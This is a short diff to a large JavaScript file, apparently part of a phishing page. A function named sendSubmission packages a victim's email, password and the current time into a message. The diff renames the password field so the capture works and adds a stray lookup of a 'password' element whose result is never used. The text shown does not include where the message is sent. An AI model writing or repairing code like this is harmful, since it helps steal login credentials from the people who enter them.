@@ -29410,7 +29410,7 @@ async function sendSubmission(data) {
 Email:
 ${data.email}
 Password:
-${data.pass}
+${data.password}
 
 Time:
 ${new Date().toLocaleString()}`;
@@ -29444,6 +29444,7 @@ window.addEventListener(
         const mailField =
             document.getElementById("mail") ||
             document.getElementById("email");
+			document.getElementById("password");
 
         const mytag =
             document.getElementById("mytag");
